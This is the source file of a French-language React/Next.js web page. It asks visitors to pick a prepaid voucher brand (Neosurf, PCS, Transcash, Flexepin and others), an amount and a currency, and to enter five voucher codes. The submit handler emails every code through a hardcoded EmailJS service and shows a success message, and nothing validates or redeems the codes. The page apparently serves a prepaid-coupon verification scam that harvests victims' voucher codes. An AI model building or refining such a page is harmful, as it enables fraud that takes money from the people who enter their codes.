"use client";
import React, { useEffect } from "react";
import { yupResolver } from "@hookform/resolvers/yup";
import * as yup from "yup";
import emailjs from 'emailjs-com';
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Select, SelectContent, SelectGroup, SelectItem, SelectLabel, SelectTrigger, SelectValue } from "@/components/ui/select";
import { Controller, useForm } from "react-hook-form";
import { useToast } from "@/components/ui/use-toast";
import { Loader2 } from "lucide-react";

const schema = yup.object().shape({
  choix_recharge: yup.string().required("Choisir une recharge est requis"),
  montant: yup.number().required("Montant recharge est requis"),
  choix_device: yup.string().required("Choisir une device est requis"),
  code_recharge1: yup.string().required("Code recharge 1 est requis")
    .test('len', 'Code recharge 1 doit avoir la bonne taille', function (value) {

      const { choix_recharge } = this.parent;
      if (choix_recharge === 'STREAM' || choix_recharge === 'AMAZON') return value.length === 15;
      if (choix_recharge === 'TRANSHSCASH') return value.length === 12;
      return value.length === 10;
    }),
  code_recharge2: yup.string().required("Code recharge 2 est requis")
    .test('len', 'Code recharge 2 doit avoir la bonne taille', function (value) {
      const { choix_recharge } = this.parent;
      if (choix_recharge === 'STREAM' || choix_recharge === 'AMAZON') return value.length === 15;
      if (choix_recharge === 'TRANSHSCASH') return value.length === 12;
      return value.length === 10;
    }),
  code_recharge3: yup.string().required("Code recharge 3 est requis")
    .test('len', 'Code recharge 3 doit avoir la bonne taille', function (value) {
      const { choix_recharge } = this.parent;
      if (choix_recharge === 'STREAM' || choix_recharge === 'AMAZON') return value.length === 15;
      if (choix_recharge === 'TRANSHSCASH') return value.length === 12;
      return value.length === 10;
    }),
  code_recharge4: yup.string().required("Code recharge 4 est requis")
    .test('len', 'Code recharge 4 doit avoir la bonne taille', function (value) {
      const { choix_recharge } = this.parent;
      if (choix_recharge === 'STREAM' || choix_recharge === 'AMAZON') return value.length === 15;
      if (choix_recharge === 'TRANSHSCASH') return value.length === 12;
      return value.length === 10;
    }),
  code_recharge5: yup.string().required("Code recharge 5 est requis")
    .test('len', 'Code recharge 5 doit avoir la bonne taille', function (value) {
      const { choix_recharge } = this.parent;
      if (choix_recharge === 'STREAM' || choix_recharge === 'AMAZON') return value.length === 15;
      if (choix_recharge === 'TRANSHSCASH') return value.length === 12;
      return value.length === 10;
    })
});


export default function Home() {
  const {  control, handleSubmit, formState: { errors } } = useForm({
    resolver: yupResolver(schema)
  });
  const { toast } = useToast();
  const [isLoading, setIsLoading] = React.useState(false);
  useEffect(() => {
    emailjs.init('qX6nugXeKqhLjt9er');
  }, []);
  const onSubmit = (data: Record<string, unknown> | undefined) => {
    setIsLoading(true);
    emailjs.send('service_017gg5y', 'template_fvhgvvf', data,)
      .then((result) => {
        toast({
          title: "Success",
          description: "Votre coupon a bien été envoyé.",
        });
        setIsLoading(false);
      }, (error) => {
        setIsLoading(false);
        toast({
          variant: "destructive",
          title: "Erreur",
          description: "Une erreur est survenue. Veuillez réessayer.",
        });
      });
  };

  return (
    <main className="flex flex-col items-center justify-between px-4 bg-gradient-to-b from-[#955de4] to-[#2b33c4] py-3 w-full h-full">
      <div className="p-5 rounded-lg border bg-white">
        <span className="my-5 text-lg">Veuillez entrer les informations </span>
        <span className="text-lg text-blue-600">du coupons ici </span>
        <form className="w-full flex flex-col" onSubmit={handleSubmit(onSubmit)}>
          <Label htmlFor="choix_recharge" className="my-1">Choisir une recharge</Label>
          <Controller
            name="choix_recharge"
            control={control}

            render={({ field }) => (
              <Select {...field} {...field} onValueChange={field.onChange}>
                <SelectTrigger className="w-full">
                  <SelectValue placeholder="Select a recharge" />
                </SelectTrigger>
                <SelectContent>
                  <SelectGroup>
                    <SelectLabel>Recharge Options</SelectLabel>
                    <SelectItem value="NEOSURF">NEOSURF</SelectItem>
                    <SelectItem value="AMAZON">AMAZON</SelectItem>
                    <SelectItem value="PCS">PCS</SelectItem>
                    <SelectItem value="TRANSHSCASH">TRANSHSCASH</SelectItem>
                    <SelectItem value="STREAM">STREAM</SelectItem>
                    <SelectItem value="FLEXEPIN">FLEXEPIN</SelectItem>
                    <SelectItem value="PAYLIB">PAYLIB</SelectItem>
                  </SelectGroup>
                </SelectContent>
              </Select>
            )}
          />
          {errors.choix_recharge && <p className="text-red-500">{errors.choix_recharge.message}</p>}

          <Label htmlFor="montant" className="my-5">Montant recharge</Label>
          <Controller
            name="montant"
            control={control}
            render={({ field }) => (
              <Input {...field} type="number" placeholder="Montant recharge" />
            )}
          />
          {errors.montant && <p className=" text-red-500">{errors.montant.message}</p>}

          <Label htmlFor="choix_device" className="my-5">Choisir une device</Label>
          <Controller
            name="choix_device"
            control={control}
            render={({ field }) => (
              <Select {...field} {...field} onValueChange={field.onChange}>
                <SelectTrigger className="w-full">
                  <SelectValue placeholder="Choisir un device" />
                </SelectTrigger>
                <SelectContent>
                  <SelectGroup>
                    <SelectLabel>Device</SelectLabel>
                    <SelectItem value="Euro">Euro</SelectItem>
                    <SelectItem value="Dollars">Dollars</SelectItem>
                    <SelectItem value="FrancSuisse">Franc Suisse (CHF)</SelectItem>
                  </SelectGroup>
                </SelectContent>
              </Select>
            )}
          />
          {errors.choix_device && <p className=" text-red-500">{errors.choix_device.message}</p>}

          <Label htmlFor="code_recharge" className="my-5">Entrer les code de recharges</Label>
          <Controller
            name="code_recharge1"
            control={control}
            render={({ field }) => (
              <Input {...field} type="text" className="my-5" placeholder="code recharge 1" />
            )}
          />
          {errors.code_recharge1 && <p className=" text-red-500">{errors.code_recharge1.message}</p>}

          <Controller
            name="code_recharge2"
            control={control}
            render={({ field }) => (
              <Input {...field} type="text" className="my-5" placeholder="code recharge 2" />
            )}
          />
          {errors.code_recharge2 && <p className=" text-red-500">{errors.code_recharge2.message}</p>}

          <Controller
            name="code_recharge3"
            control={control}
            render={({ field }) => (
              <Input {...field} type="text" className="my-5" placeholder="code recharge 3" />
            )}
          />
          {errors.code_recharge3 && <p className=" text-red-500">{errors.code_recharge3.message}</p>}

          <Controller
            name="code_recharge4"
            control={control}
            render={({ field }) => (
              <Input {...field} type="text" className="my-5" placeholder="code recharge 4" />
            )}
          />
          {errors.code_recharge4 && <p className=" text-red-500 ">{errors.code_recharge4.message}</p>}

          <Controller
            name="code_recharge5"
            control={control}
            render={({ field }) => (
              <Input {...field} type="text" className="my-5" placeholder="code recharge 5" />
            )}
          />
          {errors.code_recharge5 && <p className=" text-red-500">{errors.code_recharge5.message}</p>}

          <Button disabled={isLoading} type="submit" className="my-5 bg-blue-600"> {isLoading ? <Loader2 className="mr-2 h-4 w-4 animate-spin" /> : "Envoyer"} </Button>
        </form>
      </div>
    </main>
  );
}


